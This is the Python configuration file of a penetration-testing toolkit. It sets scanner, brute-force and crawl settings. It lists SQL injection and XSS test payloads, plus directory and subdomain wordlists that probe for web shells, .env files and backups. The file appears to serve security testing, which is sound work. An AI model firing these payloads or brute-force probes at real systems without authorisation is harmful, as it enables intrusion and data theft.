"""
BYMA TOOLS - Global Configuration
Semua settings dan konfigurasi global ada di sini
"""
import os
from pathlib import Path

# ==================== PATH CONFIGURATION ====================
BASE_DIR = Path(__file__).resolve().parent.parent
CONFIG_DIR = BASE_DIR / "config"
CORE_DIR = BASE_DIR / "core"
TOOLS_DIR = BASE_DIR / "tools"
WORDLISTS_DIR = BASE_DIR / "wordlists"
OUTPUT_DIR = BASE_DIR / "output"
DATABASE_DIR = BASE_DIR / "database"
TEST_DIR = BASE_DIR / "tests"

# ==================== DATABASE CONFIGURATION ====================
DATABASE_PATH = DATABASE_DIR / "byma.db"

# ==================== TOOL INFORMATION ====================
TOOL_NAME = "BYMA TOOLS"
TOOL_VERSION = "1.0.0"
TOOL_AUTHOR = "BYMA SECURITY"
TOOL_DESCRIPTION = "Multi-Purpose Cybersecurity Toolkit"
TOOL_GITHUB = "https://github.com/byma-tools/byma-tools"

# ==================== SCANNER SETTINGS ====================
DEFAULT_THREADS = 50
MAX_THREADS = 200
DEFAULT_TIMEOUT = 5  # seconds
MAX_TIMEOUT = 30
DEFAULT_PORT_RANGE = "1-1024"
TOP_PORTS_100 = [
    7, 9, 13, 21, 22, 23, 25, 26, 37, 53, 79, 80, 81, 88, 106, 110, 111,
    113, 119, 135, 139, 143, 144, 179, 199, 254, 255, 280, 311, 389, 427,
    443, 444, 445, 464, 465, 500, 512, 513, 514, 515, 524, 541, 548, 554,
    563, 587, 625, 631, 636, 646, 787, 808, 873, 902, 990, 993, 995, 1000,
    1022, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1080, 1099, 1110, 1433,
    1434, 1521, 1720, 1723, 1755, 1900, 2000, 2001, 2049, 2100, 2103, 2121,
    2199, 2717, 2869, 2967, 3000, 3001, 3128, 3268, 3306, 3389, 3986, 4000,
    4001, 4443, 4444, 4899, 5000, 5001, 5003, 5009, 5050, 5051, 5060, 5101
]

# ==================== NETWORK SETTINGS ====================
SCAPY_TIMEOUT = 2
ARP_REQUEST_COUNT = 3
PACKET_CAPTURE_COUNT = 100

# ==================== PASSWORD SETTINGS ====================
DEFAULT_PASSWORD_LENGTH = 12
MIN_PASSWORD_LENGTH = 8
MAX_PASSWORD_LENGTH = 64
HASH_CRACK_THREADS = 100
BRUTE_FORCE_THREADS = 10
BRUTE_FORCE_DELAY = 1  # seconds between attempts

# ==================== WEB SETTINGS ====================
DEFAULT_CRAWL_DEPTH = 3
MAX_CRAWL_PAGES = 1000
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
REQUEST_DELAY = 0.1  # seconds between requests

# ==================== WORDLIST SETTINGS ====================
DEFAULT_WORDLIST = WORDLISTS_DIR / "common.txt"
SUBDOMAIN_WORDLIST = WORDLISTS_DIR / "subdomains.txt"
DIRECTORY_WORDLIST = WORDLISTS_DIR / "directories.txt"
PASSWORD_WORDLIST = WORDLISTS_DIR / "passwords.txt"
USERNAME_WORDLIST = WORDLISTS_DIR / "usernames.txt"

# ==================== OUTPUT SETTINGS ====================
OUTPUT_FORMATS = ["text", "json", "csv", "html"]
DEFAULT_OUTPUT_FORMAT = "json"
REPORT_DIR = OUTPUT_DIR / "reports"

# ==================== LOGGING SETTINGS ====================
LOG_LEVEL = "INFO"
LOG_FORMAT = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
LOG_DATE_FORMAT = "%Y-%m-%d %H:%M:%S"
LOG_FILE = DATABASE_DIR / "byma.log"
MAX_LOG_SIZE = 10 * 1024 * 1024  # 10MB
LOG_BACKUP_COUNT = 5

# ==================== RATE LIMITING ====================
DEFAULT_RATE_LIMIT = 100  # requests per second
BURST_RATE_LIMIT = 200

# ==================== SEVERITY LEVELS ====================
SEVERITY = {
    "CRITICAL": "red",
    "HIGH": "light_red",
    "MEDIUM": "yellow",
    "LOW": "cyan",
    "INFO": "white",
    "NONE": "green"
}

# ==================== PORT SERVICES ====================
COMMON_PORTS = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    111: "RPCBind",
    135: "MSRPC",
    139: "NetBIOS",
    143: "IMAP",
    443: "HTTPS",
    445: "SMB",
    993: "IMAPS",
    995: "POP3S",
    1433: "MSSQL",
    1723: "PPTP",
    3306: "MySQL",
    3389: "RDP",
    5432: "PostgreSQL",
    5900: "VNC",
    6379: "Redis",
    8080: "HTTP-Proxy",
    8443: "HTTPS-Alt",
    27017: "MongoDB"
}

# ==================== SQL INJECTION PAYLOADS ====================
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1/*",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "1' OR '1'='1' --",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' OR pg_sleep(5)--"
]

# ==================== XSS PAYLOADS ====================
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "'-alert('XSS')-'",
    "\"><script>alert('XSS')</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<details open ontoggle=alert('XSS')>",
    "<math><mtext><table><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>",
    "prompt(1)",
    "confirm(1)",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select autofocus onfocus=alert('XSS')>",
    "<textarea autofocus onfocus=alert('XSS')>",
    "<keygen autofocus onfocus=alert('XSS')>",
    "<video autofocus onfocus=alert('XSS')>",
    "<svg/onload=alert('XSS')>"
]

# ==================== DIRECTORY WORDLIST DEFAULT ====================
DEFAULT_DIRECTORIES = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php",
    "panel", "cpanel", "phpmyadmin", "phpMyAdmin", "myadmin",
    "backup", "backups", "bak", "old", "temp", "tmp", "test",
    "api", "v1", "v2", "graphql", "swagger", "docs",
    "config", "configuration", "settings", "setup", "install",
    "database", "db", "sql", "mysql", "postgres",
    "uploads", "upload", "files", "media", "images", "img",
    "static", "assets", "css", "js", "javascript", "scripts",
    "cgi-bin", "scripts", "bin", "sbin",
    ".git", ".svn", ".env", ".htaccess", ".htpasswd",
    "robots.txt", "sitemap.xml", "crossdomain.xml",
    "server-status", "server-info",
    "webmail", "mail", "email", "smtp", "pop3",
    "ftp", "sftp", "ssh", "remote",
    "blog", "news", "forum", "community", "support",
    "help", "faq", "about", "contact",
    "dashboard", "home", "index", "default",
    "status", "health", "ping", "info",
    "debug", "trace", "log", "logs", "error",
    "register", "signup", "signin", "auth", "oauth",
    "search", "find", "query",
    "user", "users", "account", "accounts", "profile",
    "admin.php", "admin.html", "admin/",
    "wp-content", "wp-includes", "wp-config.php.bak",
    "config.php", "config.php.bak", "config.php.old",
    "database.sql", "dump.sql", "backup.sql",
    ".env", ".env.local", ".env.production",
    "Dockerfile", "docker-compose.yml",
    "package.json", "composer.json", "Gemfile",
    "Makefile", "Gruntfile.js", "gulpfile.js",
    "webpack.config.js", "tsconfig.json",
    "README.md", "CHANGELOG.md", "LICENSE",
    ".DS_Store", "Thumbs.db",
    "shell.php", "cmd.php", "c99.php", "r57.php",
    "web.config", "httpd.conf", "nginx.conf"
]

# ==================== SUBDOMAIN WORDLIST DEFAULT ====================
DEFAULT_SUBDOMAINS = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
    "ns3", "ns4", "dns", "dns1", "dns2", "mx", "mx1", "mx2", "relay",
    "panel", "cpanel", "whm", "webdisk", "autoconfig", "autodiscover",
    "admin", "administrator", "webmin", "user", "users", "portal",
    "dev", "development", "test", "testing", "staging", "stage", "sandbox",
    "qa", "uat", "demo", "preview", "beta", "alpha", "nightly", "canary",
    "api", "api2", "api3", "v1", "v2", "v3", "graphql", "rest", "ws", "socket",
    "app", "app2", "apps", "application", "mobile", "m", "wap",
    "web", "www2", "www3", "web2", "site", "portal",
    "blog", "wordpress", "wp", "wp2", "cms", "drupal", "joomla",
    "shop", "store", "ecommerce", "cart", "checkout", "pay", "payment",
    "forum", "community", "social", "chat", "messaging", "im",
    "support", "help", "helpdesk", "ticket", "docs", "wiki", "kb", "knowledge",
    "cdn", "static", "assets", "media", "images", "img", "files", "download",
    "downloads", "upload", "uploads", "content",
    "db", "database", "mysql", "mysql2", "sql", "postgres", "redis", "mongo", "mssql",
    "phpmyadmin", "pma", "adminer", "myadmin",
    "git", "gitlab", "github", "bitbucket", "svn", "repo", "repository", "code",
    "ci", "jenkins", "travis", "circle", "drone", "build", "deploy", "release",
    "jira", "confluence", "redmine", "trello", "asana", "monday",
    "monitor", "monitoring", "grafana", "prometheus", "nagios", "zabbix", "status",
    "log", "logs", "logging", "kibana", "elastic", "elasticsearch",
    "vpn", "remote", "rdp", "ssh", "sftp", "jump", "bastion",
    "proxy", "reverse", "gateway", "gw", "lb", "loadbalancer", "haproxy", "nginx",
    "mail2", "imap", "imap2", "pop2", "pop3", "sftp", "smtp2", "smtp3",
    "mx3", "mx4", "exchange", "owa", "activesync", "autodiscover",
    "crm", "erp", "hr", "finance", "accounting", "billing",
    "intranet", "extranet", "internal", "private", "secure", "sso", "auth",
    "ldap", "active", "ad", "dc", "kdc", "domain",
    "backup", "backups", "bak", "old", "archive", "snap",
    "temp", "tmp", "cache", "cached",
    "ns5", "ns6", "ns7", "ns8", "ns9", "ns10",
    "ipv4", "ipv6", "ip", "ip6", "a", "aaaa", "cname",
    "mx10", "mx20", "mx30",
    "whmcs", "billing", "panel2", "cpanel2",
    "cloud", "aws", "azure", "gcp", "s3", "storage",
    "docker", "k8s", "kubernetes", "container", "registry",
    "edge", "node", "node1", "node2", "worker", "master",
    "search", "solr", "sphinx", "algolia",
    "ml", "ai", "data", "analytics", "stats", "statistics",
    "print", "printer", "scan", "fax",
    "tv", "video", "stream", "media2", "radio", "live",
    "games", "game", "play", "gaming",
    "iot", "device", "sensor", "hub", "gateway2"
]

# ==================== AUTO CREATE DIRECTORIES ====================
for _dir in [WORDLISTS_DIR, OUTPUT_DIR, DATABASE_DIR, REPORT_DIR]:
    _dir.mkdir(parents=True, exist_ok=True)
